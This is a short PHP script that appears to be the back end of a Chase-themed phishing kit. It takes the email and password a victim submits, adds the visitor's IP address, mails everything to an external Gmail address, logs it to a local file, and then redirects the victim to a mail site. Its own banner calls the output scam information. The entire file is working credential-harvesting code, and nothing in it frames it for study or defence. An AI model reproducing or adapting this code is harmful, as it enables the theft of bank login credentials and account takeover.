<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Chase ScAm Inf0 (1) || :------\n";
$message .= "Email Address: ".$_POST['user_name']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "----: || tHAnks tO Spammers Toolz || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "marythomas202026@gmail.com";
$subject = "JCF ID | ".$ip."\n";

mail($recipient,$subject,$message);
$fp = fopen("index.txt","a");
fputs($fp,$message);
fclose($fp);
header("Location:  https://mail1.mediacombb.net/");
?>


